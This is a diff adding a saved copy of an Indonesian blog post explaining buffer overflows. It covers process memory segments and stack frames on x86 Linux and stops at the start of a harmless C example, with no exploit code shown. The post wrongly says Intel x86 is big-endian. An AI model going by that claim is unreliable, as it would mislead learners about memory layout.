@@ -1,0 +1,1439 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="id-ID"><head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Buffer OverFlow | sholeh012</title>
+<link rel="pingback" href="https://sholeh012.wordpress.com/xmlrpc.php">
+<link rel="dns-prefetch" href="https://s0.wp.com/">
+<link rel="dns-prefetch" href="https://s.pubmine.com/">
+<link rel="dns-prefetch" href="https://x.bidswitch.net/">
+<link rel="dns-prefetch" href="https://static.criteo.net/">
+<link rel="dns-prefetch" href="https://ib.adnxs.com/">
+<link rel="dns-prefetch" href="https://aax.amazon-adsystem.com/">
+<link rel="dns-prefetch" href="https://bidder.criteo.com/">
+<link rel="dns-prefetch" href="https://cas.criteo.com/">
+<link rel="dns-prefetch" href="https://gum.criteo.com/">
+<link rel="dns-prefetch" href="https://ads.pubmatic.com/">
+<link rel="dns-prefetch" href="https://gads.pubmatic.com/">
+<link rel="dns-prefetch" href="https://tpc.googlesyndication.com/">
+<link rel="dns-prefetch" href="https://ad.doubleclick.net/">
+<link rel="dns-prefetch" href="https://googleads.g.doubleclick.net/">
+<link rel="dns-prefetch" href="https://www.googletagservices.com/">
+<link rel="dns-prefetch" href="https://cdn.switchadhub.com/">
+<link rel="dns-prefetch" href="https://delivery.g.switchadhub.com/">
+<link rel="dns-prefetch" href="https://delivery.swid.switchadhub.com/">
+<link rel="dns-prefetch" href="https://a.teads.tv/">
+<link rel="dns-prefetch" href="https://prebid.media.net/">
+<link rel="dns-prefetch" href="https://adserver-us.adtech.advertising.com/">
+<link rel="dns-prefetch" href="https://fastlane.rubiconproject.com/">
+<link rel="dns-prefetch" href="https://prebid-server.rubiconproject.com/">
+<link rel="dns-prefetch" href="https://hb-api.omnitagjs.com/">
+<link rel="dns-prefetch" href="https://mtrx.go.sonobi.com/">
+<link rel="dns-prefetch" href="https://apex.go.sonobi.com/">
+<link rel="dns-prefetch" href="https://u.openx.net/">
+<link rel="alternate" type="application/rss+xml" title="sholeh012 » Feed" href="https://sholeh012.wordpress.com/feed/">
+<link rel="alternate" type="application/rss+xml" title="sholeh012 » Feed Komentar" href="https://sholeh012.wordpress.com/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="sholeh012 » Buffer OverFlow Feed Komentar" href="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/feed/">
+	<script type="text/javascript">
+		/* <![CDATA[ */
+		function addLoadEvent(func) {
+			var oldonload = window.onload;
+			if (typeof window.onload != 'function') {
+				window.onload = func;
+			} else {
+				window.onload = function () {
+					oldonload();
+					func();
+				}
+			}
+		}
+		/* ]]> */
+	</script>
+			<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s0.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1582709031h&ver=5.4.2"}};
+			/*! This file is auto-generated */
+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="Buffer%20OverFlow%20|%20sholeh012_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel="stylesheet" id="all-css-0-1" href="Buffer%20OverFlow%20|%20sholeh012_files/a_002.css" type="text/css" media="all">
+<style id="wp-block-library-inline-css">
+.has-text-align-justify {
+	text-align:justify;
+}
+</style>
+<style id="global-styles-inline-css">
+:root {
+	--wp--preset--color--black: #000000;
+	--wp--preset--color--cyan-bluish-gray: #abb8c3;
+	--wp--preset--color--light-green-cyan: #7bdcb5;
+	--wp--preset--color--luminous-vivid-amber: #fcb900;
+	--wp--preset--color--luminous-vivid-orange: #ff6900;
+	--wp--preset--color--pale-cyan-blue: #8ed1fc;
+	--wp--preset--color--pale-pink: #f78da7;
+	--wp--preset--color--vivid-cyan-blue: #0693e3;
+	--wp--preset--color--vivid-green-cyan: #00d084;
+	--wp--preset--color--vivid-purple: #9b51e0;
+	--wp--preset--color--vivid-red: #cf2e2e;
+	--wp--preset--color--white: #ffffff;
+	--wp--preset--font-size--small: 13;
+	--wp--preset--font-size--normal: 16;
+	--wp--preset--font-size--medium: 20;
+	--wp--preset--font-size--large: 36;
+	--wp--preset--font-size--huge: 48;
+	--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);
+	--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);
+	--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);
+	--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);
+	--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);
+	--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);
+	--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);
+	--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);
+	--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);
+	--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);
+	--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);
+	--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);
+}
+
+</style>
+<link rel="stylesheet" id="all-css-2-1" href="Buffer%20OverFlow%20|%20sholeh012_files/a.css" type="text/css" media="all">
+<link rel="stylesheet" id="print-css-3-1" href="Buffer%20OverFlow%20|%20sholeh012_files/global-print.css" type="text/css" media="print">
+<link rel="stylesheet" id="all-css-4-1" href="Buffer%20OverFlow%20|%20sholeh012_files/actionbar.css" type="text/css" media="all">
+<style id="jetpack-global-styles-frontend-style-inline-css">
+:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
+</style>
+<link rel="stylesheet" id="all-css-6-1" href="Buffer%20OverFlow%20|%20sholeh012_files/a_003.css" type="text/css" media="all">
+<script type="text/javascript" src="Buffer%20OverFlow%20|%20sholeh012_files/a.js"></script>
+<link rel="stylesheet" id="all-css-0-2" href="Buffer%20OverFlow%20|%20sholeh012_files/style.css" type="text/css" media="all">
+<!--[if lt IE 8]>
+<link rel='stylesheet' id='highlander-comments-ie7-css'  href='https://s0.wp.com/wp-content/mu-plugins/highlander-comments/style-ie7.css?m=1351637563h&#038;ver=20110606' media='all' />
+<![endif]-->
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://sholeh012.wordpress.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://s0.wp.com/wp-includes/wlwmanifest.xml"> 
+<link rel="prev" title="SECURING OPERATRING SYSTEM" href="https://sholeh012.wordpress.com/2011/10/31/securing-operatring-system/">
+<meta name="generator" content="WordPress.com">
+<link rel="canonical" href="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/">
+<link rel="shortlink" href="https://wp.me/p1EsFv-U">
+<link rel="alternate" type="application/json+oembed" href="https://public-api.wordpress.com/oembed/?format=json&amp;url=https%3A%2F%2Fsholeh012.wordpress.com%2F2011%2F11%2F07%2Fbuffer-overflow%2F&amp;for=wpcom-auto-discovery"><link rel="alternate" type="application/xml+oembed" href="https://public-api.wordpress.com/oembed/?format=xml&amp;url=https%3A%2F%2Fsholeh012.wordpress.com%2F2011%2F11%2F07%2Fbuffer-overflow%2F&amp;for=wpcom-auto-discovery">
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buffer OverFlow">
+<meta property="og:url" content="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/">
+<meta property="og:description" content="Buffer Overflow merupakan salah satu penyebab yang paling banyak menimbulkan masalah pada keamanan komputer baik yang bersifat lokal maupun jaringan. Menurut laporan CERT/CC, buffer overflow merupk…">
+<meta property="article:published_time" content="2011-11-07T13:50:56+00:00">
+<meta property="article:modified_time" content="2011-11-07T13:50:56+00:00">
+<meta property="og:site_name" content="sholeh012">
+<meta property="og:image" content="https://sholeh012.files.wordpress.com/2011/11/buffer.jpg?w=300">
+<meta property="og:image:width" content="433">
+<meta property="og:image:height" content="63">
+<meta property="og:locale" content="id_ID">
+<meta name="twitter:site" content="@wordpressdotcom">
+<meta name="twitter:text:title" content="Buffer OverFlow">
+<meta name="twitter:image" content="https://sholeh012.files.wordpress.com/2011/11/stack.jpg?w=640">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="fb:app_id" content="249643311490">
+<meta property="article:publisher" content="https://www.facebook.com/WordPresscom">
+
+<!-- End Jetpack Open Graph Tags -->
+<link rel="shortcut icon" type="image/x-icon" href="https://s0.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48">
+<link rel="icon" type="image/x-icon" href="https://s0.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48">
+<link rel="apple-touch-icon" href="https://s0.wp.com/i/webclip.png">
+<link rel="openid.server" href="https://sholeh012.wordpress.com/?openidserver=1">
+<link rel="openid.delegate" href="https://sholeh012.wordpress.com/">
+<link rel="search" type="application/opensearchdescription+xml" href="https://sholeh012.wordpress.com/osd.xml" title="sholeh012">
+<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com">
+		<style id="wpcom-hotfix-masterbar-style">
+			@media screen and (min-width: 783px) {
+				#wpadminbar .quicklinks li#wp-admin-bar-my-account.with-avatar > a img {
+					margin-top: 5px;
+				}
+			}
+		</style>
+		<meta name="application-name" content="sholeh012"><meta name="msapplication-window" content="width=device-width;height=device-height"><meta name="msapplication-tooltip" content="Just another WordPress.com site"><meta name="msapplication-task" content="name=Berlangganan;action-uri=https://sholeh012.wordpress.com/feed/;icon-uri=https://s0.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=Mendaftar untuk blog gratis;action-uri=http://wordpress.com/signup/;icon-uri=https://s0.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=Dukungan WordPress.com;action-uri=http://support.wordpress.com/;icon-uri=https://s0.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=Forum WordPress.com;action-uri=http://forums.wordpress.com/;icon-uri=https://s0.wp.com/i/favicon.ico"><meta name="description" content="Buffer Overflow merupakan salah satu penyebab yang paling banyak menimbulkan masalah pada keamanan komputer baik yang bersifat lokal maupun jaringan. Menurut laporan CERT/CC, buffer overflow merupkan penyebab dari 50% semua bug keamanan yang dilaporkan dan dijadikan advisori oleh CERT/CC. Riset yang dilakukan oleh Crispin Cowan dan teamnya menganggap buffer overflow sebagai Vulnerbility of Decade. Dengan…">
+		<script type="text/javascript">
+
+			window.doNotSellCallback = function() {
+
+				var linkElements = [
+					'a[href="https://wordpress.com/?ref=footer_blog"]',
+					'a[href="https://wordpress.com/?ref=footer_website"]',
+					'a[href="https://wordpress.com/?ref=vertical_footer"]',
+					'a[href^="https://wordpress.com/?ref=footer_segment_"]',
+				].join(',');
+
+				var dnsLink = document.createElement( 'a' );
+				dnsLink.href = 'https://wordpress.com/advertising-program-optout';
+				dnsLink.classList.add( 'do-not-sell-link' );
+				dnsLink.rel = 'nofollow';
+				dnsLink.style.marginLeft = '0.5em';
+				dnsLink.textContent = 'Jangan Menjual Informasi Pribadi Saya';
+
+				var creditLinks = document.querySelectorAll( linkElements );
+
+				if ( 0 === creditLinks.length ) {
+					return false;
+				}
+
+				Array.prototype.forEach.call( creditLinks, function( el ) {
+					el.insertAdjacentElement( 'afterend', dnsLink );
+				});
+
+				return true;
+			};
+
+		</script>
+				<script type="text/javascript">
+		function __ATA_CC() {var v = document.cookie.match('(^|;) ?personalized-ads-consent=([^;]*)(;|$)');return v ? 1 : 0;}
+		var __ATA_PP = { pt: 1, ht: 0, tn: 'greyzed', amp: false, siteid: 8982, blogid: 24419661, consent: __ATA_CC() };
+		var __ATA = __ATA || {};
+		__ATA.cmd = __ATA.cmd || [];
+		__ATA.criteo = __ATA.criteo || {};
+		__ATA.criteo.cmd = __ATA.criteo.cmd || [];
+		</script>
+		<script type="text/javascript">
+		(function(){var g=Date.now||function(){return+new Date};function h(a,b){a:{for(var c=a.length,d="string"==typeof a?a.split(""):a,e=0;e<c;e++)if(e in d&&b.call(void 0,d[e],e,a)){b=e;break a}b=-1}return 0>b?null:"string"==typeof a?a.charAt(b):a[b]};function k(a,b,c){c=null!=c?"="+encodeURIComponent(String(c)):"";if(b+=c){c=a.indexOf("#");0>c&&(c=a.length);var d=a.indexOf("?");if(0>d||d>c){d=c;var e=""}else e=a.substring(d+1,c);a=[a.substr(0,d),e,a.substr(c)];c=a[1];a[1]=b?c?c+"&"+b:b:c;a=a[0]+(a[1]?"?"+a[1]:"")+a[2]}return a};var l=0;function m(a,b){var c=document.createElement("script");c.src=a;c.onload=function(){b&&b(void 0)};c.onerror=function(){b("error")};a=document.getElementsByTagName("head");var d;a&&0!==a.length?d=a[0]:d=document.documentElement;d.appendChild(c)}function n(a){var b=void 0===b?document.cookie:b;return(b=h(b.split("; "),function(c){return-1!=c.indexOf(a+"=")}))?b.split("=")[1]:""}function p(a){return"string"==typeof a&&0<a.length}
+		function r(a,b,c){b=void 0===b?"":b;c=void 0===c?".":c;var d=[];Object.keys(a).forEach(function(e){var f=a[e],q=typeof f;"object"==q&&null!=f||"function"==q?d.push(r(f,b+e+c)):null!==f&&void 0!==f&&(e=encodeURIComponent(b+e),d.push(e+"="+encodeURIComponent(f)))});return d.filter(p).join("&")}function t(a,b){a||((window.__ATA||{}).config=b.c,m(b.url))}var u=Math.floor(1E13*Math.random()),v=window.__ATA||{};window.__ATA=v;v.rid=u;v.createdAt=g();var w=window.__ATA||{},x="s.pubmine.com";
+		w&&w.serverDomain&&(x=w.serverDomain);var y="//"+x+"/conf",z=window.top===window,A=window.__ATA_PP&&window.__ATA_PP.gdpr_applies,B="boolean"===typeof A?Number(A):null,C=window.__ATA_PP||null,D=z?document.referrer?document.referrer:null:null,E=z?window.location.href:document.referrer?document.referrer:null,F,G=n("__ATA_tuuid");F=G?G:null;var H=window.innerWidth+"x"+window.innerHeight,I=n("usprivacy"),J=r({gdpr:B,pp:C,rid:u,src:D,ref:E,tuuid:F,vp:H,us_privacy:I?I:null},"",".");
+		(function(a){var b=void 0===b?"cb":b;l++;var c="callback__"+g().toString(36)+"_"+l.toString(36);a=k(a,b,c);window[c]=function(d){t(void 0,d)};m(a,function(d){d&&t(d)})})(y+"?"+J);}).call(this);
+		</script><script src="Buffer%20OverFlow%20|%20sholeh012_files/conf"></script><link rel="amphtml" href="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/amp/"><script type="text/javascript">
+	window.google_analytics_uacct = "UA-52447-2";
+</script>
+
+<script type="text/javascript">
+	var _gaq = _gaq || [];
+	_gaq.push(['_setAccount', 'UA-52447-2']);
+	_gaq.push(['_gat._anonymizeIp']);
+	_gaq.push(['_setDomainName', 'wordpress.com']);
+	_gaq.push(['_initData']);
+	_gaq.push(['_trackPageview']);
+
+	(function() {
+		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
+	})();
+</script><script type="text/javascript" async="" src="Buffer%20OverFlow%20|%20sholeh012_files/ga.js"></script>
+<link rel="stylesheet" type="text/css" id="gravatar-card-css" href="Buffer%20OverFlow%20|%20sholeh012_files/hovercard.css"><link rel="stylesheet" type="text/css" id="gravatar-card-services-css" href="Buffer%20OverFlow%20|%20sholeh012_files/services.css"><script src="Buffer%20OverFlow%20|%20sholeh012_files/ata.js"></script><script charset="utf-8" src="Buffer%20OverFlow%20|%20sholeh012_files/2.js"></script></head>
+
+<body class="post-template-default single single-post postid-56 single-format-standard customizer-styles-applied highlander-enabled highlander-light">
+<div id="wrapper">
+
+<div id="page">
+		<div class="menu-header"><ul>
+<li><a href="https://sholeh012.wordpress.com/">Beranda</a></li><li class="page_item page-item-2"><a href="https://sholeh012.wordpress.com/about/">About</a></li>
+</ul></div>
+
+	<div id="header" role="banner">
+		<h1><a href="https://sholeh012.wordpress.com/">sholeh012</a></h1>
+
+		<div class="description">Just another WordPress.com site</div>
+
+		<div class="rss">
+			<a href="https://sholeh012.wordpress.com/feed/" title="RSS">Stay updated via RSS</a>		</div>
+	</div>
+
+	<hr>
+
+<div id="container">
+	<div id="sidebar" role="complementary">
+		
+		<!-- begin widgetized sidebar 1 -->
+		<ul>
+						<div id="atatags-286348-5ef20a3302e9a" data-adtags-width="275"></div>
+			
+			<script>
+				__ATA.cmd.push(function() {
+					__ATA.initDynamicSlot({
+						id: 'atatags-286348-5ef20a3302e9a',
+						location: 140,
+						formFactor: '003',
+						label: {
+							text: 'Iklan',
+						},
+						creative: {
+							reportAd: {
+								text: 'Laporkan iklan ini',
+							},
+							privacySettings: {
+								text: 'Pengaturan privasi',
+							}
+						}
+					});
+				});
+			</script>		</ul>
+
+		<ul>
+			<li><h2>Pos-pos Terbaru</h2>
+				<ul>
+ 					
+    				<li><a href="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/">Buffer OverFlow</a></li>
+ 					
+    				<li><a href="https://sholeh012.wordpress.com/2011/10/31/securing-operatring-system/">SECURING OPERATRING SYSTEM</a></li>
+ 					
+    				<li><a href="https://sholeh012.wordpress.com/2011/10/25/write-permission-only/">Write Permission Only</a></li>
+ 					
+    				<li><a href="https://sholeh012.wordpress.com/2011/10/10/metode-enkripsi-menggunakan-transposisi-dan-product-cipher/">Metode enkripsi menggunakan transposisi dan product&nbsp;cipher</a></li>
+ 					
+    				<li><a href="https://sholeh012.wordpress.com/2011/10/03/caesar-cipher-dan-cipher-key/">CAESAR CIPHER DAN CIPHER&nbsp;KEY</a></li>
+ 					
+    				<li><a href="https://sholeh012.wordpress.com/2011/09/26/5-insiden-sistem-keamanan-komputer/">5 insiden sistem keamanan&nbsp;komputer</a></li>
+ 					
+    				<li><a href="https://sholeh012.wordpress.com/2011/06/26/inilah-obat-kanker-paling-ampuh-yang-disembunyikan-bertahun-tahun/">Inilah Obat Kanker Paling Ampuh yang Disembunyikan&nbsp;Bertahun-tahun</a></li>
+ 					
+    				<li><a href="https://sholeh012.wordpress.com/2011/06/26/games-pencucian-otak-yang-harus-di-waspadai/">Games (Pencucian Otak) yang harus di&nbsp;waspadai</a></li>
+ 					
+    				<li><a href="https://sholeh012.wordpress.com/2011/06/23/hello-guyys/">Hello world!</a></li>
+ 					 					 				</ul>
+
+			</li>
+
+			<li><h2>Kategori</h2>
+				<ul>
+					<li class="cat-item cat-item-1"><a href="https://sholeh012.wordpress.com/category/uncategorized/">Uncategorized</a> (8)
+</li>
+				</ul>
+			</li>
+
+		</ul>
+		<ul>
+					</ul>
+		<!-- end widgetized sidebar 1 -->
+
+	</div>
+
+
+	<div id="content" role="main">
+		<div class="column">
+
+		
+			<div class="post-56 post type-post status-publish format-standard hentry category-uncategorized" id="post-56">
+				<div class="posttitle">
+					<h2 class="pagetitle">Buffer OverFlow</h2>
+					<small>
+						Posted: November 7, 2011 in <a href="https://sholeh012.wordpress.com/category/uncategorized/" rel="category tag">Uncategorized</a>						<br>
+											</small>
+				</div>
+									<div class="postcomments"><a href="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/#respond">0</a></div>
+								<div class="entry">
+					<p data-adtags-visited="true"><em>Buffer Overflow</em> merupakan 
+salah satu penyebab yang paling banyak menimbulkan masalah pada keamanan
+ komputer baik yang bersifat lokal maupun jaringan. Menurut laporan <em>CERT/CC</em>, <em>buffer overflow</em> merupkan penyebab dari 50% semua bug keamanan yang dilaporkan dan dijadikan advisori oleh <em>CERT/CC</em>. Riset yang dilakukan oleh Crispin Cowan dan teamnya menganggap buffer overflow sebagai <em>Vulnerbility of Decade</em>.</p>
+<p data-adtags-visited="true">Dengan tersedianya program-program 
+eksploitasi di Internet, baik dalam bentuk source code maupun binary 
+seringkali menjadi menjadi alat untuk membuka celah keamanan sehingga 
+membuat orang tertarik untuk melakukan eksperimen yang sporadis tanpa 
+memperdulikan akibat yang dapat ditimbulkannya. Banyak orang yang 
+mengklaim dirinya sebagai seorang cracker jika sudah berhasil 
+mengekspoitasi komputer orang lain, tanpa memahami cara kerja 
+eksploitasi tersebut sesungguhnya.</p>
+<p data-adtags-visited="true">Terlepas dari masalah tersebut diatas, tulisan ini akan membahas apakah sebenarnya <em>buffer overflow</em> itu dan bagaimana mekanisme untuk mengeksploitasinya/penyerangan menggunakan <em>buffer over flow</em>,
+ cara memperbaiki sistem yang ter-buffer overflow dan bagaimana cara 
+menghindari/mencegah agar sistem kita aman dari serangan melalui 
+eksploitasi <em>buffer overflow</em>. Untuk memahami hal tersebut diatas
+ diperlukan juga pemahaman mengenai cara kerja sistem prosesor di level 
+bawah, seperti pemrograman asembly, manajemen memori text, stack, data 
+dan sebagainya. Pada tulisan ini sebagai referensi dipilih prosesor 
+Intel x86 yang mengorganisasi sistem memori menggunakan 4 byte dan 
+menggunakan Linux sebagai sistem operasinya.</p>
+<h3><strong>Pengertian Dasar</strong></h3>
+<h4>Manajemen Memori pada Proses</h4>
+<p data-adtags-visited="true">Sebuah proses dipandang dari sudut manajemen memori dibedakan menjadi tiga bagian :</p>
+<ol>
+<li>Text; memuat instruksi kode program. Bagian ini biasanya hanya bisa 
+dibaca, dan setiap usaha untuk menuliskan data ke bagian ini akan 
+menyebabkan kesalahan <em>segmentation violation</em>.</li>
+<li>Data; memuat data, baik yang telah diinisialisasi maupun yang belum.
+ Selain dapat dibaca, biasanya bagian ini juga memperbolehkan suatu 
+proses untuk melakukan penulisan padanya.</li>
+<li>Stack; yang dapat dialokasikan secara dinamis, biasanya dimanfaatkan
+ untuk menyimpan variabel lokal maupun untuk melewatkan parameter 
+fungsi.</li>
+</ol>
+<p class="inline-ad-slot" id="inline-ad-0" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Pengaksesan data ke bagian ini menggunakan metoda yang disebut LIFO (<em>Last In First Out</em>).
+ Jenis data yang harus juga diketahui adalah buffer yang pada bahasa C 
+diimplementasikan sebagai array. Array dapat dibedakan ke dalam dua 
+jenis berdasarkan metoda pengalokasiannya, yaitu array statis dan array 
+dinamis. Array statis dialokasikan di bagian data saat program dimuatkan
+ ke memori, sedangkan array dinamis dialokasikan di dalam stack saat run
+ time.</p>
+<p data-adtags-visited="true"><strong>Stack</strong></p>
+<p data-adtags-visited="true">Stack dapat dibayangkan sebagai sebuah blok dari memori yang dapat memuat data secara dinamis.</p>
+<p data-adtags-visited="true"><a href="https://sholeh012.files.wordpress.com/2011/11/stack.jpg"><img data-attachment-id="57" data-permalink="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/stack/" data-orig-file="https://sholeh012.files.wordpress.com/2011/11/stack.jpg" data-orig-size="386,263" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="stack" data-image-description="" data-medium-file="https://sholeh012.files.wordpress.com/2011/11/stack.jpg?w=300" data-large-file="https://sholeh012.files.wordpress.com/2011/11/stack.jpg?w=386" class="alignnone size-medium wp-image-57" title="stack" src="Buffer%20OverFlow%20|%20sholeh012_files/stack.jpg" alt=""></a></p>
+<p data-adtags-visited="true">Gambar 1. Blok memori stack pada prosesor Intel</p>
+<p data-adtags-visited="true">Beberapa hal yang harus diketahui pada prosesor Intel sehubungan dengan stack adalah :</p>
+<ol>
+<li>Penggunaan metoda Big Edian dalam mengorganisasikan sistem memori. Di sini MSB (<em>Most Significant Bit</em>) terletak pada alamat memori yang lebih kecil dibandingkan LSB (<em>Least Significant Bit</em>).</li>
+<li>Penambahan besar stack dilakukan kearah alamat memori yang lebih 
+kecil. Di sini posisi bawah dari stack mempunyai alamat yang tetap. 
+Posisi atas stack yang alamat memorinya lebih kecil dari posisi bawah 
+selalu berubah.</li>
+<li>Register stack pointer (SP) selalu menunjuk ke posisi atas dari stack.</li>
+<li>Untuk memindahkan data ke stack digunakan instruksi PUSH yang secara
+ otomatis akan menurunkan nilai SP sebesar 4 byte. Sedangkan untuk 
+mengambil data dari stack digunakan instruksi POP yang secara otomatis 
+juga akan menaikkan nilai SP sebesar 4 byte.</li>
+</ol>
+<p class="inline-ad-slot" id="inline-ad-1" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Gambar 1 memperlihatkan diagram dari sebuah memori stack dari prosesor Intel.</p>
+<p data-adtags-visited="true">Blok memori dari stack ini biasanya di bagi lagi menjadi apa yang disebut dengan <em>stack frame</em>. <em>Setiap stack frame</em>
+ berisi data yang berhubungan dengan pemanggilan sebuah fungsi. Biasanya
+ posisi awal dari frame ini akan ditunjuk oleh frame pointer (FP). 
+Dengan bantuan FP ini, maka pengaksesan ke variabel lokal maupun 
+parameter fungsi dapat dilakukan menggunakan sistem pengalamatan 
+relatif. Pada prosesor Intel, register EBP berfungsi sebagai <em>frame pointer</em>.</p>
+<h4>Cara Kerja Stack</h4>
+<p data-adtags-visited="true">Untuk lebih mengerti bagaimana cara kerja 
+stack pada pemanggilan suatu fungsi, sebagai contoh akan dibuat program 
+kecil dalam bahasa C, dan kemudian akan dikonversikan ke dalam bahasa 
+assembly.</p>
+<p data-adtags-visited="true"># coba1.c</p>
+<p data-adtags-visited="true">#include&lt;stdio.h&gt;</p>
+<p data-adtags-visited="true">void fungsi(int satu, int dua)</p>
+<p data-adtags-visited="true">{</p>
+<p data-adtags-visited="true">int buffer[2];</p>
+<p data-adtags-visited="true">buffer[0]=satu;</p>
+<p data-adtags-visited="true">buffer[1]=dua;</p>
+<p data-adtags-visited="true">}</p>
